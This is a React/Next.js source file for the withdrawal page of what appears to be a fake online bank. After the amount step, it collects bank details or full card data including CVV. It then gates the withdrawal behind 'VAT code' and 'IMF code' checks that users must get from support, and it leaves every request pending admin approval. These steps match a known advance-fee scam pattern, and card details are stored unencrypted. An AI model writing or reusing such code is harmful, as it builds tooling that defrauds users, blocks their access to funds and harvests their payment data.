"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Separator } from "@/components/ui/separator"
import {
  TrendingUp,
  CreditCard,
  Building2,
  Smartphone,
  CheckCircle,
  AlertCircle,
  Loader2,
  Shield,
  Clock,
  Banknote,
  ArrowRight,
} from "lucide-react"
import { UserLayout } from "@/components/user-layout"
import { useAuth } from "@/lib/auth-context"
import { useSiteSettings } from "@/lib/site-settings-context"
import { collection, addDoc, serverTimestamp } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { CurrencyDisplay } from "@/components/currency-display"

export default function WithdrawPage() {
  const { user, userProfile, validateIMFCode, validateVATCode } = useAuth()
  const { siteSettings } = useSiteSettings()
  const [loading, setLoading] = useState(false)
  const [success, setSuccess] = useState("")
  const [error, setError] = useState("")
  const [step, setStep] = useState(1)

  const [withdrawData, setWithdrawData] = useState({
    amount: "",
    method: "bank", // bank, card, mobile
    accountType: "checking", // checking, savings
  })

  const [bankData, setBankData] = useState({
    accountNumber: "",
    routingNumber: "",
    accountName: "",
  })

  const [cardData, setCardData] = useState({
    number: "",
    expiry: "",
    cvv: "",
    name: "",
  })

  const [vatCode, setVatCode] = useState("")
  const [imfCode, setImfCode] = useState("")

  const withdrawFee = Number.parseFloat(withdrawData.amount || "0") * 0.015 // 1.5% fee
  const totalAmount = Number.parseFloat(withdrawData.amount || "0") + withdrawFee

  const handleInputChange = (field: string, value: string) => {
    setWithdrawData({ ...withdrawData, [field]: value })
  }

  const handleBankChange = (field: string, value: string) => {
    setBankData({ ...bankData, [field]: value })
  }

  const handleCardChange = (field: string, value: string) => {
    setCardData({ ...cardData, [field]: value })
  }

  const handleNext = () => {
    if (step === 1) {
      // Validate first step
      if (!withdrawData.amount) {
        setError("Please enter an amount")
        return
      }

      if (Number.parseFloat(withdrawData.amount) <= 0) {
        setError("Amount must be greater than 0")
        return
      }

      if (Number.parseFloat(withdrawData.amount) < 20) {
        setError("Minimum withdrawal amount is $20")
        return
      }

      const availableBalance =
        withdrawData.accountType === "savings" ? userProfile?.savingsBalance || 0 : userProfile?.balance || 0

      if (totalAmount > availableBalance) {
        setError("Insufficient balance")
        return
      }

      setError("")
      setStep(2)
    } else if (step === 2) {
      // Validate payment method data
      if (withdrawData.method === "bank") {
        if (!bankData.accountNumber || !bankData.routingNumber || !bankData.accountName) {
          setError("Please fill in all bank details")
          return
        }
      } else if (withdrawData.method === "card") {
        if (!cardData.number || !cardData.expiry || !cardData.cvv || !cardData.name) {
          setError("Please fill in all card details")
          return
        }
      }

      setError("")
      setStep(3)
    } else if (step === 3) {
      // Go to IMF verification step
      setStep(4)
    }
  }

  const handleVATVerification = async () => {
    if (!vatCode) {
      setError("Please enter your VAT code")
      return
    }

    setLoading(true)
    setError("")

    try {
      // Validate VAT code against user's stored code
      const isVATValid = await validateVATCode(vatCode)

      if (!isVATValid) {
        throw new Error("Invalid VAT code. Please contact support for assistance.")
      }

      setError("")
      setStep(4) // Move to IMF verification
    } catch (err: any) {
      setError(err.message || "VAT verification failed")
    } finally {
      setLoading(false)
    }
  }

  const handleIMFVerification = async () => {
    if (!imfCode) {
      setError("Please enter your IMF code")
      return
    }

    setLoading(true)
    setError("")

    try {
      // Validate IMF code against user's stored code
      const isIMFValid = await validateIMFCode(imfCode)

      if (!isIMFValid) {
        throw new Error("Invalid IMF code. Please contact support for assistance.")
      }

      // Proceed with withdrawal
      await handleWithdraw()
    } catch (err: any) {
      setError(err.message || "IMF verification failed")
      setLoading(false)
    }
  }

  const handleWithdraw = async () => {
    try {
      if (!user || !db) throw new Error("User not authenticated")

      // Create transaction record with pending status for admin approval
      await addDoc(collection(db, "transactions"), {
        userId: user.uid,
        type: "withdrawal",
        amount: Number.parseFloat(withdrawData.amount),
        fee: withdrawFee,
        total: totalAmount,
        method: withdrawData.method,
        accountType: withdrawData.accountType,
        status: "pending", // Always pending for admin approval
        timestamp: serverTimestamp(),
        date: new Date().toISOString().split("T")[0],
        description: `Withdrawal via ${withdrawData.method}`,
        imfVerified: true,
        vatVerified: true,
        requiresApproval: true,
        // Store payment method details (in real app, encrypt these)
        paymentDetails: withdrawData.method === "bank" ? bankData : cardData,
      })

      // Don't update balance yet - wait for admin approval
      setSuccess(`Withdrawal request submitted successfully! Your transaction is pending admin approval.`)
      setWithdrawData({
        amount: "",
        method: "bank",
        accountType: "checking",
      })
      setBankData({
        accountNumber: "",
        routingNumber: "",
        accountName: "",
      })
      setCardData({
        number: "",
        expiry: "",
        cvv: "",
        name: "",
      })
      setImfCode("")
      setVatCode("")
      setStep(1)
    } catch (err: any) {
      setError(err.message || "Failed to process withdrawal")
    } finally {
      setLoading(false)
    }
  }

  return (
    <UserLayout>
      <div className="p-4 lg:p-6">
        <div className="max-w-2xl mx-auto">
          {/* Header */}
          <div className="mb-6 lg:mb-8">
            <h1 className="text-2xl lg:text-3xl font-bold text-gray-900 flex items-center">
              <TrendingUp className="w-8 h-8 mr-3" style={{ color: siteSettings.primaryColor }} />
              Withdraw Funds
            </h1>
            <p className="text-gray-600 mt-2">Transfer money from your account</p>
          </div>

          {/* Balance Display */}
          <div className="grid md:grid-cols-2 gap-4 mb-6">
            <Card className="border-0 shadow-lg bg-gradient-to-r from-blue-50 to-indigo-50">
              <CardContent className="p-6">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-gray-600">Checking Balance</p>
                    <p className="text-xl font-bold text-gray-900">
                      <CurrencyDisplay amount={userProfile?.balance || 0} />
                    </p>
                  </div>
                  <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center">
                    <Banknote className="w-5 h-5 text-blue-600" />
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="border-0 shadow-lg bg-gradient-to-r from-emerald-50 to-teal-50">
              <CardContent className="p-6">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-gray-600">Savings Balance</p>
                    <p className="text-xl font-bold text-gray-900">
                      <CurrencyDisplay amount={userProfile?.savingsBalance || 0} />
                    </p>
                  </div>
                  <div className="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center">
                    <Banknote className="w-5 h-5 text-emerald-600" />
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {success && (
            <Alert className="mb-6 border-green-200 bg-green-50">
              <CheckCircle className="h-4 w-4 text-green-600" />
              <AlertDescription className="text-green-600">{success}</AlertDescription>
            </Alert>
          )}

          {error && (
            <Alert className="mb-6 border-red-200 bg-red-50">
              <AlertCircle className="h-4 w-4 text-red-600" />
              <AlertDescription className="text-red-600">{error}</AlertDescription>
            </Alert>
          )}

          {/* Progress Steps */}
          <div className="mb-8">
            <div className="flex items-center justify-center space-x-2">
              <div className={`flex items-center ${step >= 1 ? "text-blue-600" : "text-gray-400"}`}>
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center ${
                    step >= 1 ? "bg-blue-600 text-white" : "bg-gray-200"
                  }`}
                >
                  1
                </div>
                <span className="ml-2 text-sm font-medium">Amount</span>
              </div>
              <ArrowRight className="w-4 h-4 text-gray-400" />
              <div className={`flex items-center ${step >= 2 ? "text-blue-600" : "text-gray-400"}`}>
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center ${
                    step >= 2 ? "bg-blue-600 text-white" : "bg-gray-200"
                  }`}
                >
                  2
                </div>
                <span className="ml-2 text-sm font-medium">Method</span>
              </div>
              <ArrowRight className="w-4 h-4 text-gray-400" />
              <div className={`flex items-center ${step >= 3 ? "text-blue-600" : "text-gray-400"}`}>
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center ${
                    step >= 3 ? "bg-blue-600 text-white" : "bg-gray-200"
                  }`}
                >
                  3
                </div>
                <span className="ml-2 text-sm font-medium">VAT</span>
              </div>
              <ArrowRight className="w-4 h-4 text-gray-400" />
              <div className={`flex items-center ${step >= 4 ? "text-blue-600" : "text-gray-400"}`}>
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center ${
                    step >= 4 ? "bg-blue-600 text-white" : "bg-gray-200"
                  }`}
                >
                  4
                </div>
                <span className="ml-2 text-sm font-medium">IMF</span>
              </div>
            </div>
          </div>

          <Card className="shadow-xl border-0">
            <CardHeader>
              <CardTitle className="flex items-center">
                {step === 1 && (
                  <>
                    <TrendingUp className="w-5 h-5 mr-2" style={{ color: siteSettings.primaryColor }} />
                    Withdrawal Amount
                  </>
                )}
                {step === 2 && (
                  <>
                    <CreditCard className="w-5 h-5 mr-2" style={{ color: siteSettings.primaryColor }} />
                    Payment Method
                  </>
                )}
                {step === 3 && (
                  <>
                    <Shield className="w-5 h-5 mr-2" style={{ color: siteSettings.primaryColor }} />
                    VAT Code Verification
                  </>
                )}
                {step === 4 && (
                  <>
                    <Shield className="w-5 h-5 mr-2" style={{ color: siteSettings.primaryColor }} />
                    IMF Code Verification
                  </>
                )}
              </CardTitle>
              <CardDescription>
                {step === 1 && "Enter the amount you want to withdraw"}
                {step === 2 && "Choose your withdrawal method"}
                {step === 3 && "Enter your VAT verification code"}
                {step === 4 && "Enter your IMF verification code"}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              {step === 1 && (
                <>
                  {/* Amount and Account Type */}
                  <div className="grid md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label>Amount</Label>
                      <div className="relative">
                        <CurrencyDisplay
                          amount={0}
                          symbolOnly
                          className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500"
                        />
                        <Input
                          type="number"
                          value={withdrawData.amount}
                          onChange={(e) => handleInputChange("amount", e.target.value)}
                          placeholder="0.00"
                          className="pl-8"
                          step="0.01"
                          min="20"
                        />
                      </div>
                      <p className="text-xs text-gray-500">
                        Minimum withdrawal: <CurrencyDisplay amount={20} />
                      </p>
                    </div>

                    <div className="space-y-2">
                      <Label>Withdraw From</Label>
                      <Select
                        value={withdrawData.accountType}
                        onValueChange={(value) => handleInputChange("accountType", value)}
                      >
                        <SelectTrigger>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="checking">Checking Account</SelectItem>
                          <SelectItem value="savings">Savings Account</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  {/* Fee Breakdown */}
                  {withdrawData.amount && Number.parseFloat(withdrawData.amount) > 0 && (
                    <div className="bg-gray-50 p-4 rounded-lg space-y-2">
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">Withdrawal Amount:</span>
                        <span>
                          <CurrencyDisplay amount={Number.parseFloat(withdrawData.amount)} />
                        </span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">Processing Fee (1.5%):</span>
                        <span>
                          <CurrencyDisplay amount={withdrawFee} />
                        </span>
                      </div>
                      <Separator />
                      <div className="flex justify-between font-medium">
                        <span>Total Deducted:</span>
                        <span>
                          <CurrencyDisplay amount={totalAmount} />
                        </span>
                      </div>
                    </div>
                  )}
                </>
              )}

              {step === 2 && (
                <>
                  {/* Withdrawal Methods */}
                  <Tabs value={withdrawData.method} onValueChange={(value) => handleInputChange("method", value)}>
                    <TabsList className="grid w-full grid-cols-3">
                      <TabsTrigger value="bank" className="flex items-center">
                        <Building2 className="w-4 h-4 mr-2" />
                        Bank
                      </TabsTrigger>
                      <TabsTrigger value="card" className="flex items-center">
                        <CreditCard className="w-4 h-4 mr-2" />
                        Card
                      </TabsTrigger>
                      <TabsTrigger value="mobile" className="flex items-center">
                        <Smartphone className="w-4 h-4 mr-2" />
                        Mobile
                      </TabsTrigger>
                    </TabsList>

                    <TabsContent value="bank" className="space-y-4">
                      <div className="space-y-4">
                        <div className="space-y-2">
                          <Label>Account Number</Label>
                          <Input
                            value={bankData.accountNumber}
                            onChange={(e) => handleBankChange("accountNumber", e.target.value)}
                            placeholder="1234567890"
                          />
                        </div>
                        <div className="space-y-2">
                          <Label>Routing Number</Label>
                          <Input
                            value={bankData.routingNumber}
                            onChange={(e) => handleBankChange("routingNumber", e.target.value)}
                            placeholder="123456789"
                          />
                        </div>
                        <div className="space-y-2">
                          <Label>Account Holder Name</Label>
                          <Input
                            value={bankData.accountName}
                            onChange={(e) => handleBankChange("accountName", e.target.value)}
                            placeholder="John Doe"
                          />
                        </div>
                      </div>
                    </TabsContent>

                    <TabsContent value="card" className="space-y-4">
                      <div className="space-y-4">
                        <div className="space-y-2">
                          <Label>Card Number</Label>
                          <Input
                            value={cardData.number}
                            onChange={(e) => handleCardChange("number", e.target.value)}
                            placeholder="1234 5678 9012 3456"
                          />
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div className="space-y-2">
                            <Label>Expiry Date</Label>
                            <Input
                              value={cardData.expiry}
                              onChange={(e) => handleCardChange("expiry", e.target.value)}
                              placeholder="MM/YY"
                            />
                          </div>
                          <div className="space-y-2">
                            <Label>CVV</Label>
                            <Input
                              value={cardData.cvv}
                              onChange={(e) => handleCardChange("cvv", e.target.value)}
                              placeholder="123"
                            />
                          </div>
                        </div>
                        <div className="space-y-2">
                          <Label>Cardholder Name</Label>
                          <Input
                            value={cardData.name}
                            onChange={(e) => handleCardChange("name", e.target.value)}
                            placeholder="John Doe"
                          />
                        </div>
                      </div>
                    </TabsContent>

                    <TabsContent value="mobile" className="space-y-4">
                      <div className="text-center py-8">
                        <Smartphone className="w-12 h-12 text-gray-400 mx-auto mb-4" />
                        <h3 className="text-lg font-medium text-gray-900 mb-2">Mobile Wallet Coming Soon</h3>
                        <p className="text-gray-600">We're working on mobile wallet integration</p>
                      </div>
                    </TabsContent>
                  </Tabs>

                  {/* Processing Time */}
                  <div className="bg-blue-50 p-4 rounded-lg">
                    <div className="flex items-start space-x-3">
                      <Clock className="w-5 h-5 text-blue-600 mt-0.5" />
                      <div>
                        <h4 className="font-medium text-blue-900">Processing Time</h4>
                        <p className="text-sm text-blue-700">
                          {withdrawData.method === "bank"
                            ? "Bank transfers typically take 1-3 business days"
                            : "Card withdrawals are processed within 24 hours"}
                        </p>
                      </div>
                    </div>
                  </div>
                </>
              )}

              {step === 3 && (
                <div className="space-y-6">
                  <Alert className="border-amber-200 bg-amber-50">
                    <Shield className="h-4 w-4 text-amber-600" />
                    <AlertDescription className="text-amber-700">
                      VAT code verification is required for all withdrawals. Your transaction will be reviewed by our
                      admin team.
                    </AlertDescription>
                  </Alert>

                  <div className="space-y-2">
                    <Label>VAT Code *</Label>
                    <Input
                      value={vatCode}
                      onChange={(e) => setVatCode(e.target.value)}
                      placeholder="Enter your VAT verification code"
                      className="font-mono"
                      required
                    />
                    <p className="text-xs text-gray-500">Your VAT code was provided during account setup.</p>
                  </div>
                </div>
              )}

              {step === 4 && (
                <div className="space-y-6">
                  <Alert className="border-amber-200 bg-amber-50">
                    <Shield className="h-4 w-4 text-amber-600" />
                    <AlertDescription className="text-amber-700">
                      IMF code verification is the final step. Your transaction will be submitted for admin approval.
                    </AlertDescription>
                  </Alert>

                  <div className="space-y-2">
                    <Label>IMF Code *</Label>
                    <Input
                      value={imfCode}
                      onChange={(e) => setImfCode(e.target.value)}
                      placeholder="Enter your IMF verification code"
                      className="font-mono"
                      required
                    />
                    <p className="text-xs text-gray-500">
                      Contact support if you don't have your IMF code: support@{siteSettings.siteName.toLowerCase()}
                      .com
                    </p>
                  </div>

                  {/* Final Summary */}
                  <div className="bg-gray-50 p-4 rounded-lg space-y-2">
                    <h4 className="font-medium text-gray-900">Withdrawal Summary</h4>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">Amount:</span>
                      <span>
                        <CurrencyDisplay amount={Number.parseFloat(withdrawData.amount || "0")} />
                      </span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">Fee:</span>
                      <span>
                        <CurrencyDisplay amount={withdrawFee} />
                      </span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">Method:</span>
                      <span className="capitalize">{withdrawData.method}</span>
                    </div>
                    <Separator />
                    <div className="flex justify-between font-medium">
                      <span>Total Deducted:</span>
                      <span>
                        <CurrencyDisplay amount={totalAmount} />
                      </span>
                    </div>
                  </div>
                </div>
              )}

              <div className="flex space-x-4">
                {step > 1 && (
                  <Button variant="outline" onClick={() => setStep(step - 1)} className="flex-1" disabled={loading}>
                    Back
                  </Button>
                )}
                <Button
                  onClick={step === 3 ? handleVATVerification : step === 4 ? handleIMFVerification : handleNext}
                  className="flex-1 text-white shadow-lg"
                  style={{
                    background: `linear-gradient(to right, ${siteSettings.primaryColor}, ${siteSettings.secondaryColor})`,
                  }}
                  disabled={loading || withdrawData.method === "mobile"}
                >
                  {loading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : step === 4 ? (
                    "Verify & Submit"
                  ) : step === 3 ? (
                    "Verify VAT Code"
                  ) : step === 2 ? (
                    "Continue to Verification"
                  ) : (
                    "Continue"
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </UserLayout>
  )
}
